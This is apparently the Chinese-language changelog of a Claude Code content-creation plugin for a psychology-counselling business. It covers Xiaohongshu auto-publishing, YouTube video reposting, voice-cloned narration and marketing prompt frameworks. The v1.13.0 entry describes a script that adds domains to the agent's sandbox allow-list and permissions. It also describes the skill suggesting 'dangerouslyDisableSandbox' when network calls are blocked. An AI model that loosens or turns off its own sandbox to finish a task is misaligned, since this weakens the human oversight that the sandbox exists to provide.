- **scripts/transport_video.py**：经 video-transport REST 建任务（`POST /api/video-transport/jobs`，
  异步 202）→ 轮询（`GET .../jobs/{id}`，pending→running→completed/failed，每 ~15s，瞬时故障容忍）→
  取产物（相对 `/uploads/…` 拼成免鉴权公网绝对 URL）。含 `--url/--job/--list/--retry/--delete/
  --download/--no-wait`。沿用发布脚本的**防重发**范式：状态未确认落 `unknown` 带 job_id，绝不重建任务。
  客户端预检只放行 youtube.com / youtu.be（防子串绕过）。
- **凭据零新增**：复用小红书运营接入的 `NBDPSY_XHS_API_KEY`（同一套 `get_current_user` 鉴权），
  配过自动发布即可直接搬运；基址可选 `NBDPSY_VIDEO_API_BASE`（默认 `https://xhs.nbdpsy.com`）。
- **沙盒放行**新增 `xhs.nbdpsy.com`（nbdpsy_common.SANDBOX_ALLOW_DOMAINS）。
- **登记**：install.sh / install.ps1 / plugin.json / marketplace.json / sync_shared.py 加入新技能；
  nbdpsy-guide 增「第 3.5 步 · 搬运 YouTube 视频」操作引导与能力表/菜单/FAQ 条目。
- 测试 +12（test_transport_video.py：URL 预检、错误体两形、产物 URL 拼接、建任务 payload、轮询终态/
  瞬时容忍/永久错误、CLI 拒非 YouTube/缺 key），全量 210 过。

---

## [1.17.0] — 2026-07-16

### 视频配音支持火山克隆音色（seed-icl-2.0）——用运营自己的声音

- **tts_gen.py 新增克隆音色路由**：默认音色（VOLC_TTS_VOICE）以 `S_` 开头（火山声音复刻 speaker）时，
  旁白走 `X-Api-Resource-Id: seed-icl-2.0` + `X-Api-App-Id` 头（VOLC_TTS_APPID）+ body 带 user.uid，
  speaker=S_xxx；否则回归 seed-tts-2.0 默认音色；再不行 edge。同一个 unidirectional 端点、复用现有
  流式解析器。纯人声（声音复刻是标准 TTS，无自带 BGM/音效，与 BGM 层不冲突）、全片音色一致。
  缺 VOLC_TTS_APPID 时报清晰错误（不静默失败）。凭据零新增槽位（复用 API Key/AppID/默认音色）。
- check_env.py / .env.example / SKILL.md / setup.py 同步克隆音色说明。
- 实测：用真实克隆音色 S_moiqVFN72 出合法 mp3（24kHz、ID3）。测试 +3，全量 199 过。

> 管理端：后台豆包卡片填 API Key + AppID + 默认音色（S_xxx），凭据包/运营接入包自动带上
> （需 NBDpsy 后端 assemble_bundle 更新，见该仓库同日提交）。

---

## [1.16.0] — 2026-07-15

### 新增 nbdpsy-guide 上手向导 + 小红书运营 API 操作手册 + 凭据持久化澄清

- **新 skill `nbdpsy-guide`**（第 6 个）：新运营说「教我用 / 能干啥 / 帮我上手 / 怎么发小红书 /
  怎么装插件 / 有哪些账号 / 看笔记数据」时的第一站。先自检环境（doctor + --self-check），再介绍
  五个内容技能能干啥、怎么串产线，带做第一个任务；并逐条给出 server 工具操作命令（装插件 /
  登录扫码 / 看账号 / 验活 / 发布 / 拉数据分析）。已登记 install.sh / install.ps1 / plugin.json。
- **publish_note.py 新增 `--notes <账号>`**：拉账号已发布笔记的清单与互动数据供分析；server 端
  该端点（`GET /api/accounts/{id}/notes`）正在上线中，404 优雅降级为「还在上线中」而非报错。
- **凭据持久化说明**：接入包与 guide 讲明「凭据存 `~/.config/nbdpsy/secrets.env` 永久保存，
  新对话自动读、只需发一次；重发新包自动覆盖旧凭据」。配置包 Part A 改为「先 doctor 查是否已装、
  已装则跳过安装只换凭据」。装插件默认步骤（v1.15.1）补的 serverUrl 同步进 guide。
- 测试：+7 例（--notes 三态 + guide 结构四项），全量 196 过。

---

## [1.15.1] — 2026-07-15

### 修：装插件默认步骤漏 serverUrl，运营会卡在「插件连不上」

- Chrome 插件（小红书登录用）弹窗要填 **serverUrl + apikey 两样**，SKILL「装插件」章节的
  手写兜底步骤只写了 apikey、漏了 serverUrl（`https://mcp.nbdpsy.com`）。虽然 skill 已写
  「以 `--extension-info` 返回的 install_steps 为准」，但兜底版补全 serverUrl + 无痕模式勾选，
  防 agent 走简版时运营卡住。server 端 `GET /api/extension`（v0.4.0）返回的官方步骤本就完整。

---

## [1.15.0] — 2026-07-15

### 一键接入自检 --self-check（配合配置包在 Claude Desktop 里傻瓜式接入）

- **publish_note.py 新增 `--self-check`**：一条命令验证「连通性 + 身份 + 被授权账号 + 就绪」，
  输出结构化 JSON（`ok`/`ready`/`identity`/`account_count`/`accounts`/`need_relogin`/`verdict`），
  可反复跑（运营说「帮我做接入自检 / 我配好了吗」即触发）。whoami/accounts 失败都保持 self-check
  信封（不落 publish 失败信封）；`cookie_status=error` 不误导重扫；`unknown` 视为可用（新号初始态）。
- **管理后台配置包模板优化**（NBDpsy 后端）：新增 O 段环境闸门（先验本机可执行，粘错到
  Chat/网页/手机版会被友好挡回并指去 Claude Desktop 的 Code 标签页；Windows 探针用
  `python --version` 而非在 PowerShell/Git Bash 里不存在的 `ver`）；B 段从裸 curl 自检收敛为一条
  `--self-check`；apikey 从正文散落 4 处收敛到凭据块 1 处（更安全）。
- 测试：+4 例（self_check 就绪/401/无账号/accounts 失败信封），全量 189 过。

---

## [1.14.0] — 2026-07-13

### 小红书账号接入自检 + chrome 插件安装/登录/验活全套指导

- **publish_note.py 新增三个接入辅助命令**：
  - `--extension-info`：插件包 download_url + 官方 install_steps + `server_time`（登录轮询起点，须在扫码前取）
  - `--wait-login --since <server_time> [--account-id N]`：轮询 `GET /api/login/poll` 等运营扫码完成（done=0/未等到=1）
  - `--check-cookie <账号名或id>`：触发 cookie 验活并轮询五态到结果（valid=0；error=基础设施失败≠失效）
- **SKILL.md 新增「小红书账号接入与管理」章节**：三步接入自检（凭据 xhs_ready / 授权账号 /
  插件判据倒推）、装插件逐步人话指导（chrome://extensions 开发者模式加载已解压 + 填 apikey）、
  登录新号与重扫流程（先取 server_time → 无痕窗扫码 → wait-login 确认 → check-cookie 兜底）、
  用账号打开小红书（插件卡片 cookie 注入）。content-pipeline 7.5 步与 README 排障表同步指路。
- 测试：+3 例（extension_info 透传 / wait_login 轮询与 URL 编码与 account_id / cookie 验活 202→轮询），全量 185 过。

---

## [1.13.0] — 2026-07-13

### 小红书自动发布（经 nbdpsy-api，纯 REST）+ Claude 沙盒网络放行

> 服务端 nbdpsy-mcp 已删除 MCP、收口为纯 REST 的 **nbdpsy-api**（仓库改名 Buxiulei/nbdpsy-server，
> 线上 `https://mcp.nbdpsy.com`，`GET /api/manifest` 自描述）。本版让工具包直接消费该 API，
> 小红书图文笔记从「只能人工发布」升级为「自动发布可选、人工兜底」。

- **新增 `nbdpsy-xiaohongshu-creator/scripts/publish_note.py`**：解析笔记「发布文案」块 +
  `images/post-NN/` 配图（base64 内联，服务端无上传端点）→ `POST /api/publish-jobs`（异步 202）→
  轮询到 published/failed；支持 `--list-accounts`（选号）/ `--job`（复查）/ `--schedule`（定时，带时区
  偏移）/ `--dry-run`；标题≤20/正文≤900/话题≤10/图 1–18 超限提前 warning（服务端会静默截断）；
  frontmatter `hashtags: [#a, #b]` 非法 YAML 有退化解析；错误体两套形状（401/422=detail，其余=error）
  已适配；cookie 失效提前预警。
- **新增凭据 `NBDPSY_XHS_API_KEY`（可选）+ `NBDPSY_XHS_API_BASE`**：doctor 报 `xhs_ready`、
  env_check xhs/pipeline profile 列为可选项（缺失只 warn 不阻塞）、setup 凭据向导第 5 问；
  由管理后台「小红书运营接入」生成的运营接入包一键导入。
- **新增 `nbdpsy_common.py sandbox allow`**：把 nbdpsy 域名合并进 `~/.claude/settings.json` 的
  `sandbox.network.allowedDomains` + `permissions.allow`（只追加不覆盖、不碰 sandbox.enabled、
  坏 JSON 拒写）——解决 Claude Code Bash 沙盒（macOS/Linux/WSL2）拦外网致发布失败；setup 向导
  自动执行一次，运行期被拦时 skill 会引导重跑并提示 `dangerouslyDisableSandbox` 兜底。
- **SKILL.md/README 更新**：xiaohongshu-creator 第 7 步改「发布（自动可选）或交付（人工兜底）」，
  发布前必须经运营确认账号与篇目；content-pipeline 插入第 7.5 步可选自动发布；README 流程图/
  凭据手册/排障表同步（新增沙盒拦网条目）。
- 测试：新增 test_publish_note.py（16 例）+ test_sandbox_allow.py（5 例），全量 179 过。

---

## [1.12.0] — 2026-07-12

### 小红书：场景深挖路径升级为 MECE 体系（12 条 · 经三路红队攻击重构）

> 上一版只有 2 条深挖路径（处境具象化 / 认知反转），不满足 MECE。本版经**四路调研 + 三路对抗验证**重构：R1 求助行为模型（Andersen/HBM/Rickwood 等 8 个模型）、R2 痛点方法论（JTBD/Schwartz 认知五阶段）、R3 36 条真实爆款归纳、**R4 用我们自己 51 个长期客的真实付费触发时刻做校验**。

- **分类基准（唯一划分维度）**：**这篇笔记消解的那一道求助闸门**——读者从「有困扰」到「决定付费求助」必须跨过的坎。互斥靠唯一落点判定，穷尽靠链路封闭，合规靠结构性隔离（危机内容在链上无处安放，自动出局）。
- **12 条路径**（三层）：认知层 P1 痛感认领 / P2 处境命名（★主力）/ P3 归因矫正 / P4 代价显影（⛔ **配额=0**）；阻力层 P5 去羞耻化 / P6 失效归因 / P7 价值论证；转化层 P8 求助路径显影 / P9 首访祛魅（★打头阵）/ P10 可得性破解 / P11 临门推动；外加 **PX 关系人轴**（读者≠受苦者时走这条，落点必须是读者自己的动作）。
- **红队攻破并修正的三处致命问题**：
  1. **旧路径 A 一条踩三道闸门**（处境+代价+无解），天然违反互斥 → 拆开；且"当事人无解"是高威胁+低效能的绝望闭环（读者会去解决恐惧本身：否认、划走），改为必须给出口。
  2. **旧路径 B 的方向被生产数据证伪**：它生产的是"自诊完成态"而非购买态——预沟通不转化 42 人中 49% 主诉 CPTSD、8 人明写 CPTSD 却零转化；站内 CPTSD 集群 11 篇日均浏览全站最低、零预约关联。→ 降权为 P3 且落点从"确认标签"改为"机制+下一步"。
  3. **框架装不下自己最好的客户**：原链条全在心理认知上，装不下海外客（长期组 22% vs 脱落组 0%、LTV 1.9 倍、投放头名）→ 新增 P10 结构约束路径。
- **⛔ P4 代价显影配额 = 0**（恐惧不是求助的独立预测因子——HBM 中国样本里"感知严重性"不显著，显著的只有自我效能 β=0.279 与行动线索 β=0.323）。分类保留仅作**废稿检测器**。
- **选型规则**：**只看落点**——"读完这篇，读者要完成的那一个内在动作是什么？"（看最后三行）数不出唯一一个 = 选题没想清楚，返工。
- **配比（客户质量优先，不按痛感强度）**：7 篇 = 固定 5 篇（P2×2 · P5 · P9 · P8）+ 弹性 2 篇；硬约束：转化层 ≥1 且必含 P9、任一路径 ≤2、**护栏与配额按"篇内出现的任一路径元素"计**（堵住"标 P2 实写 P4"的规避洞）。
- **场景深挖五问**改版：删掉「不管它会怎样」（它直接生产 P4），换成 **「这一幕反复到第几次了」（慢性度计数器）**——钩到长期客的概率与议题**慢性度**正相关、与**痛感强度无关**。
- **十条全局硬闸 G1–G10**：最低出口律 / 躯体分流律 / 不给第三人贴标签 / 不代读者作结论 / 案例三律 / 危机与 CTA 分离 / 不卖依赖 等。
- reviewer checklist-note 第 0 条同步升级（主路径唯一性、落点审查、配额规避检测）；范例 frontmatter 新增 `scene_path` / `audience` / `chronicity`。

### 小红书：竞品调研落地的三项加固（23 个同类 skill 源码拆解后择优）

- **标题字数守卫**（`count_xhs.py`）：spec 写了「标题硬限 20 字」但脚本从来没查过——现补上 `title_chars`（剔除 emoji 计数），超限 exit 2。
- **负面提示词**（`illustration-spec.md`）：扩散模型经常无视"默认 3:4"自作主张出方图/宽幅——比例行现在带负面词。⚠️ 负面词**跟着比例一起切换**（3:4 禁"正方形"、1:1 禁"竖版"），避免切到 Instagram 出现「正方形构图……不要正方形」的自相矛盾。
- **风格确认闸门**（`SKILL.md` 第 6 步）：一套笔记 = 30–70 张图，品牌基底一漂就整批全废——现强制**先只出 P1 封面 1 张**，确认配色/人物/比例/无错字后，把它当参考图再批量出剩余。

---

## [1.11.0] — 2026-07-12

### 小红书：选题必须从「现象」深挖到「痛点场景」（本 skill 最高优先级规则）

> **为什么**：停留在现象层的笔记，读者反应是"学到了"（收藏 → 划走 → 忘记）；深挖到场景层的笔记，读者反应是**"这说的就是我"**（对号入座 → 情绪被击中 → 才可能付费）。**付费不是被科普说服的，是被场景击中的。**

- **拆分逻辑重写**（`SKILL.md` 第 1 步）：从「按 H2 主题智能聚合」改为**按痛点场景分箱**——长文是知识组织，笔记必须是场景组织。一篇笔记 = 一个具体场景 ＋ 长文里能解答这个场景的那部分知识（不必和 H2 一一对应）；5–8 篇 = 5–8 个互不重叠的**具体场景**，不是 5–8 个知识角度。
- **两条深挖路径**（`references/xiaohongshu-spec.md` §1.5 新增）：
  - **路径 A · 处境具象化** = 现象 ＋ 具体处境 ＋ 恶化后果 ＋ 当事人无解
    （孩子不爱说话 → 「孩子在学校被欺负了，回家一个字不说，你问什么他都摇头」）
  - **路径 B · 认知反转** = 你以为是 X（无害解释）＋ 但其实可能是 Y（被忽略的真相）＋ 信号
    （孩子不爱说话 → 「你以为他只是性格慢热，可很多孩子在真正出事之前，给父母的信号也不过就是不太爱说话」）
- **场景深挖五问**（动笔前逐题回答，答不上来禁止开写）：谁 / 什么时刻 / 正在发生什么冲突或代价 / 不管它会怎样 / **她自己为什么解决不了**（第 ⑤ 问是"你可能需要专业帮助"这句话唯一诚实的理由）。
- **一票否决（换行业测试）**：选题换成别的行业/人群还说得通 = 还在现象层，返工。「孩子内向不爱说话」教育机构、口才班、儿童摄影都能写；「被欺负了回家一个字不说」只有心理这条路能接住。
- **标题必须承载场景**而非知识点命名（❌「CPTSD 和 PTSD 的区别」／✅「一句'方案再改改'，我在工位上僵住了」）；三段式的「痛点场景开头」直接由第 1 步挖出的场景落地。
- ⚠️ **合规护栏（YMYL 红线）**：深挖场景 ≠ 制造恐慌。可写"这些信号值得当回事"，**不可写**"不管就会出大事"；风险提示须在源长文有出处、不得为钩子夸大因果；每篇必须给建设性出路；高危议题（自伤/自杀/重度精神障碍）只做识别与转介（12356 + 建议就医），**绝不暗示我们能处理危机**。判据：读者应感到「被理解了，且知道下一步能做什么」，不是「被吓到了，必须马上花钱」。
- **审查闸门**：`nbdpsy-content-reviewer` 的 checklist-note 新增**第 0 条（生死线，先审这条）**——换行业测试 + 场景要素在位 + 三段式在位 + 合规护栏；多篇并排若读起来像一份目录（第一章定义、第二章区别…）= 整组 FAIL。
- 黄金范例升级为场景型示范（frontmatter 新增 `scene` / `scene_5q` 字段，封面与标题同步场景化）；evals 新增 4 条断言。

---

## [1.10.0] — 2026-07-12

### 小红书：正文三段式（解决「纯科普难转化 / 硬广难曝光」）
- **强制三段式骨架**：① 痛点场景开头（15–20%，必须是具体生活场景，禁问卷腔）→ ② 科普干货主体（65–75%，**完全不谈自家服务**，读者不点主页也有收获）→ ③ 结尾轻引导（1–2 句，陈述事实、给出选项，不催不促不承诺）。
  依据：对齐小红书真实决策链路（痛点搜索 → 案例对比 → 私信咨询 → 社群成交）与投流过审规律（全文绝大部分是科普、只有结尾轻引导的笔记最易过审）。
- **轻引导写法**：新增安全句式库与反面例子（`references/xiaohongshu-spec.md` §1）。
- **合规脚本新增「硬广特征」闸门**（`check_compliance.py`）：促销/催促/诱导三类词进词表，投流拒审风险卡在发布前；已做防误伤窄化——「免费的自助练习」「立即求助」等正当科普表达放行。

### 小红书：封面三层组件 + 跨平台比例切换
- **封面/末页拆为三层组件**：`■ 背景层`（品牌资产，跨笔记原样复用）+ `■ 文字层`（每篇换）+ `■ 元素层`（每篇换）——批量产出、风格自动统一。
- **预览页「小红书 3:4 / Instagram 1:1」一键切换**：切换后所有提示词的比例参数行实时替换，复制按钮复制的即该比例版本（localStorage 记忆选择）；1:1 适配规则（副标题 ≤14 字、内容页信息点收到 4–7 个）随切换提示。
- 黄金范例与 evals 断言同步更新。

---

## [1.9.0] — 2026-07-08
- **小红书提示词模板体系重审（多 agent）**：版式扩至 **17 种**（分区图标清单/对比表/流程步骤/象限/隐喻/数据占比/拆解结构/因果链/时间轴周期/自查清单/恶性循环圈/情景对话/身体地图/误区纠错/认知重构/程度光谱/概念定义卡），每种配一条实测级完整范例（`references/layout-gallery.md`）+ 选型指引（"这页信息之间是什么关系"映射表）。

## [1.8.2] — 2026-07-08
- 版式扩至 13 种；新增「详写房规」（把提示词当施工图写，锁死模型随机性保证套图风格统一）；补第二个金标准范例。

## [1.8.1] — 2026-07-08
- **修正密度口径**：密度 = 图文共同表达的信息量，**不是字数**（反例：一个大隐喻 + 几个抽象标签仍是低密度）；粗黑标题从硬性要求降为可选设计项。

## [1.8.0] — 2026-07-08
- 小红书内容页升级为**高密度知识海报体系**：图文双通道（每条信息配一个能解码的具体场景小图）、一页 6–10 个信息点、分 2–3 区块组织。

## [1.7.1] — 2026-07-07
- Windows 缺 Git 时用 winget 自动装 Git 再走即梦官方主路（真正零前提安装）。

## [1.7.0] — 2026-07-07
- Windows 也自动安装即梦 CLI（官方脚本原生支持 Windows，无需 WSL）。

## [1.6.0] — 2026-07-07
- 小红书内容页版式从单一「要点卡」扩为**信息图菜单**（要点卡 + 对比/流程/象限/隐喻/数据/拆解图），干货感更强。

## [1.5.1] — 2026-07-07
- **回滚**：配图比例从 9:16 改回 **3:4（1080×1440）**（小红书显示面积最大、点击率最高），保留信息密度提升。

## [1.5.0] — 2026-07-07
- 配图比例改 9:16 + 信息密度提升（内容页 4–6 条/说明 ≤28 字/90–140 字/留白 1/3→1/5）+ 首图安全区提示。

## [1.4.1] — 2026-07-06
- **长文渲染事故防线**：新增 `lint_markdown.py`（CommonMark 加粗侧翼冲突 + 文内 `[[n]]` 数字引用标注校验），规范强制化，审查清单增加渲染页抽查。

## [1.4.0] — 2026-07-06
- **五 skill 统一加 `nbdpsy-` 前缀**便于检索（目录/frontmatter/互引/安装器/测试全量重命名）；安装器自动清理旧名副本。

## [1.3.2] — 2026-07-06
- 插件简介改小白一句话口径，最简启用方式前置。

## [1.3.1] — 2026-07-03
- **修复**：豆包 TTS V3 流结束哨兵 `code=20000000` 不再误判为错误（生产实测发现，官方文档未载）+ 回归测试。

## [1.3.0] — 2026-07-03
- 豆包 TTS 升级 **V3 单一 API Key 引擎**（`X-Api-Key`/unidirectional，V1 凭据向后兼容）；doctor/setup/文档口径同步。
- 修复：V3 流解析改增量 UTF-8 解码（跨 chunk 中文不再丢字）。

## [1.2.0] — 2026-07-03
- **五 skill 开跑前环境自检**：共享 `env_check.py`（profile 化依赖表 + `--install` 自动补 pip 包 + 凭据/系统件指引），插件市场安装路线自愈。
- 凭据体系：`doctor` 运行时自检 + `secret import` 消化凭据包（白名单过滤、不回显值）。

## [1.1.0] — 2026-07-03
- **六项使用反馈修复**：出图/参考图真停等闸门、视频分镜确认页 storyboard、HTML 按内容命名、缺密钥指向管理员、即梦与依赖全自动安装。

## [1.0.0] — 2026-07-02
- **首个插件版本：五 skill 内容产线成型**
  - `nbdpsy-seo-artical-creator`（官网 pillar 长文，走 external API 发布，后端自动推百度/IndexNow）
  - `nbdpsy-xiaohongshu-creator`（长文拆小红书图文 + 配图提示词）
  - `nbdpsy-text-to-video`（长文/笔记 → 竖屏短视频，即梦 Seedance + 豆包 TTS + ffmpeg 合成）
  - `nbdpsy-content-reviewer`（四清单对抗审查 + 图片/视频确定性检查脚本）
  - `nbdpsy-content-pipeline`（总导演：话题 → 成品全程编排 + 审查闸门）
  - 跨平台安装器（`install.sh` / `install.ps1` / `setup.py`，三系统 + 凭据向导）；共享层 `nbdpsy_common.py`（工作区 + 凭据三层解析）；校验脚本全面 Python 化（Windows 兼容）。

---

### 更早（插件化之前的独立 skill 阶段）
- **2026-06-30**：新增 text-to-video skill（长文/小红书笔记 → 竖屏短视频）。
- **2026-06-29**：首次发布 NBDpsy 内容创作 skills（seo-artical-creator + xiaohongshu-creator）。
